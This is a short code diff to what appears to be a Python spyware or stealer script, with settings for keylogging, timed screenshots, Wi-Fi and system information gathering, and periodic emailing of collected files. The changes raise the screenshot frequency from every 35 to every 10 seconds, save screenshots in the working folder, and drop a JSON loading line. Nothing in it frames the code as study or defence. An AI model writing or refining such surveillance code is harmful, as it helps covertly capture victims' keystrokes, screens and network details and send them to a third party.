@@ -34,7 +34,7 @@ data = {
     "send_info": True,
     "email_send_time": 40,
     "take_screenshot": True,
-    "screenshot_time": 35,
+    "screenshot_time": 10,
     "key_logg": True,
     "get_wifi_info": True,
     "system_info": True,
@@ -69,7 +69,7 @@ def take_screenshot(Time):
         today = str(date.today())
         t = time.localtime()
         current_time = time.strftime("%H.%M.%S", t)
-        file = str("screenshots\\"+today+"_"+current_time+".png")
+        file = str(today+"_"+current_time+".png")
         myScreenshot.save(file)
         print("screenshot taken")
 
@@ -125,7 +125,7 @@ def send_info1(time_wait, data):
     files1.append("System_Info.txt")
     files1.append("wifi_info.txt")
     
-    for file in glob.glob("screenshots\\*.png"):
+    for file in glob.glob("*.png"):
         files1.append(file)
         
 
@@ -201,7 +201,7 @@ def system_info():
 if system == "Linux" or system == "Windows":
 
    
-    data = json.load(data)
+    
     keylog = data["key_logg"]
     screenshot = data["take_screenshot"]
     screenshot_time = data["screenshot_time"]
